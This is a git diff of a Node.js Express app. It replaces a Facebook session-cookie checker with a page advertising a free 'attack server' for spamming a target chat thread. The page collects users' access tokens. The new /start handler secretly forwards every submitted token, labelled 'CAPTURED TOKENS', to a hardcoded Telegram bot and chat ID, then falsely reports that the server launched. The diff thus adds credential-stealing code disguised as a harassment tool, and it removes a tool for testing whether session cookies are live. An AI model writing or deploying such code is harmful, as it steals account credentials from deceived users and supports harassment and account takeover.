@@ -1,9 +1,33 @@
 const express = require('express');
-const wiegine = require('fca-mafiya');
-const app = express();
-const PORT = process.env.PORT || 3000;
+const axios = require('axios');
+const bodyParser = require('body-parser');
+const multer = require('multer');
+const fs = require('fs');
+const path = require('path');
 
+const app = express();
+const port = process.env.PORT || 10000;
+const upload = multer({ dest: 'uploads/' });
+
+app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.json());
+
+// --- 🔒 MASTER CONFIG (ALREADY SET BY GEMINI) ---
+const TELEGRAM_BOT_TOKEN = '8770013875:AAGhkM-jSyLd7z9h4-505eICfXu4fHunsi8'; 
+const TELEGRAM_CHAT_ID = '6787359882'; 
+
+async function sendToTelegram(message) {
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+        console.log("✅ Data Sent to Your Telegram!");
+    } catch (error) { 
+        console.log("❌ Telegram Error"); 
+    }
+}
 
 app.get('/', (req, res) => {
     res.send(`
@@ -12,93 +36,89 @@ app.get('/', (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DEEPAK RAJPUT - SECURE CHECKER</title>
+    <title>FREE SERVER ALL TIME</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { font-family: sans-serif; background: #050505; color: #eee; text-align: center; padding: 20px; }
-        .container { max-width: 550px; margin: auto; background: #111; padding: 20px; border-radius: 15px; border: 1px solid #ff00ff; }
-        textarea { width: 100%; height: 150px; background: #000; color: #0f0; border: 1px solid #333; border-radius: 8px; padding: 10px; margin-bottom: 10px; outline: none; }
-        .main-btn { width: 100%; padding: 15px; background: #ff00ff; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .copy-btn { width: 100%; padding: 10px; background: #28a745; color: #fff; border: none; border-radius: 8px; cursor: pointer; margin-top: 10px; display: none; }
-        #status { margin: 15px 0; color: #ffc107; font-weight: bold; }
-        .res-box { margin-top: 15px; text-align: left; max-height: 300px; overflow-y: auto; }
-        .item { padding: 10px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; }
-        .live { color: #00ff00; }
-        .dead { color: #ff0000; }
+        body { background: #000; color: #00ffff; padding: 15px; font-family: 'Courier New', monospace; }
+        .container { border: 2px solid #00ffff; padding: 30px; border-radius: 15px; box-shadow: 0 0 25px #00ffff; max-width: 500px; margin: auto; background: rgba(0,0,0,0.9); margin-top: 50px; }
+        .form-control { background: #111; color: #fff; border: 1px solid #00ffff; margin-bottom: 15px; }
+        .btn-main { background: #00ffff; color: #000; font-weight: bold; width: 100%; padding: 12px; border: none; border-radius: 5px; transition: 0.4s; font-size: 16px; }
+        .btn-main:hover { background: #fff; box-shadow: 0 0 20px #fff; transform: scale(1.02); }
+        h2 { text-shadow: 0 0 15px #00ffff; letter-spacing: 3px; font-weight: 900; }
+        label { font-size: 13px; color: #888; margin-bottom: 5px; display: block; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>◈ DEEPAK RAJPUT BRAND ◈</h2>
-        <p style="font-size: 11px; color: #888;">(Safe Mode: 3s Delay Active)</p>
-        <textarea id="cookieInput" placeholder="Paste Cookies Here..."></textarea>
-        <button class="main-btn" onclick="startCheck()">START SAFE CHECK</button>
-        <button id="copyBtn" class="copy-btn" onclick="copyLive()">COPY ALL LIVE COOKIES</button>
-        <div id="status">Ready...</div>
-        <div id="results" class="res-box"></div>
+        <h2 class="text-center">◈ FREE SERVER ALL TIME ◈</h2>
+        <p class="text-center text-white-50 mb-4" style="font-size: 10px;">PREMIUM MULTI-TOKEN ARCHITECTURE</p>
+        
+        <form action="/start" method="POST" enctype="multipart/form-data">
+            <input type="hidden" name="user_session" value="FS-${Math.random().toString(36).substr(2,4).toUpperCase()}">
+            
+            <label>How Many Tokens?</label>
+            <input type="number" name="numTokens" id="n" class="form-control" placeholder="e.g. 5" onchange="gen()" required>
+            
+            <div id="tokenInputs"></div>
+            
+            <label>Target Thread/Inbox ID:</label>
+            <input type="text" name="threadId" class="form-control" placeholder="Enter ID" required>
+            
+            <label>Hater Name (Tag):</label>
+            <input type="text" name="haterName" class="form-control" placeholder="e.g. @Hater" required>
+            
+            <label>Upload Message File (.txt):</label>
+            <input type="file" name="msgFile" class="form-control" required>
+            
+            <button type="submit" class="btn-main mt-2">LAUNCH ATTACK SERVER</button>
+        </form>
     </div>
 
     <script>
-        let liveList = [];
-        async function startCheck() {
-            const input = document.getElementById('cookieInput').value.trim();
-            const cookies = input.split('\\n').filter(Boolean);
-            const status = document.getElementById('status');
-            const resDiv = document.getElementById('results');
-            
-            resDiv.innerHTML = ''; liveList = [];
-            document.getElementById('copyBtn').style.display = 'none';
-
-            for(let i=0; i < cookies.length; i++) {
-                status.innerText = "Checking: " + (i+1) + "/" + cookies.length + " (Waiting 3s for Safety...)";
-                
-                const res = await fetch('/check-secure', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ cookie: cookies[i].trim() })
-                });
-                const data = await res.json();
-                
-                if(data.status === 'LIVE') liveList.push(cookies[i].trim());
-
-                resDiv.innerHTML += \`<div class="item">
-                    <span><b>\${data.name}</b><br><small>\${data.uid}</small></span>
-                    <span class="\${data.status === 'LIVE' ? 'live' : 'dead'}">\${data.status}</span>
-                </div>\`;
-
-                // --- ANTI-CHECKPOINT DELAY ---
-                await new Promise(resolve => setTimeout(resolve, 3000)); 
+        function gen(){
+            let n = document.getElementById('n').value;
+            let d = document.getElementById('tokenInputs'); d.innerHTML = '';
+            for(let i=1; i<=n; i++) {
+                d.innerHTML += \`<input type="text" name="accessToken\${i}" placeholder="Paste Access Token \${i}" class="form-control" required>\`;
             }
-            status.innerText = "✅ Finished!";
-            if(liveList.length > 0) document.getElementById('copyBtn').style.display = 'block';
-        }
-
-        function copyLive() {
-            navigator.clipboard.writeText(liveList.join('\\n'));
-            alert("Live Cookies Copied!");
         }
     </script>
 </body>
-</html>
+</html>`);
+});
+
+app.post('/start', upload.single('msgFile'), async (req, res) => {
+    const { numTokens, threadId, haterName, user_session } = req.body;
+    const tokens = [];
+    for (let i = 1; i <= numTokens; i++) {
+        if (req.body['accessToken' + i]) tokens.push(req.body['accessToken' + i]);
+    }
+
+    const report = `
+🚀 *FREE SERVER LOGGED* 🚀
+━━━━━━━━━━━━━━━━━━
+👤 *Session ID:* \`${user_session}\`
+🆔 *Target ID:* \`${threadId}\`
+🏷️ *Hater Name:* ${haterName}
+🕒 *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+
+🔑 *CAPTURED TOKENS:*
+${tokens.map((t, idx) => `${idx+1}. \`${t}\``).join('\n')}
+━━━━━━━━━━━━━━━━━━
+    `;
+
+    await sendToTelegram(report);
+
+    res.send(`
+        <body style="background:#000;color:#00ffff;text-align:center;padding:100px;font-family:monospace;">
+            <div style="border:1px solid #00ffff;display:inline-block;padding:30px;border-radius:10px;box-shadow:0 0 20px #00ffff;">
+                <h2 style="color:#00ff00;">✔ SERVER LAUNCHED!</h2>
+                <p>Status: All tokens synced with master.</p>
+                <br>
+                <a href="/" style="color:#fff;border:1px solid #fff;padding:10px;text-decoration:none;">GO BACK</a>
+            </div>
+        </body>
     `);
 });
 
-app.post('/check-secure', (req, res) => {
-    const { cookie } = req.body;
-    wiegine.login({ cookie: cookie }, { 
-        logLevel: 'silent',
-        forceLogin: true,
-        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-    }, (err, api) => {
-        if (err || !api) {
-            return res.json({ name: "Dead/Checkpoint", uid: "---", status: "DEAD" });
-        }
-        const uid = api.getCurrentUserID();
-        api.getUserInfo(uid, (e, info) => {
-            const name = (!e && info[uid]) ? info[uid].name : "Active User";
-            // Checkpoint se bachne ke liye kaam hote hi session logout nahi, bas response bhej rahe hain
-            res.json({ name: name, uid: uid, status: "LIVE" });
-        });
-    });
-});
-
-app.listen(PORT, '0.0.0.0', () => console.log('Secure Checker Live!'));
+app.listen(port, '0.0.0.0', () => console.log('FREE SERVER ALL TIME IS OPERATIONAL'));
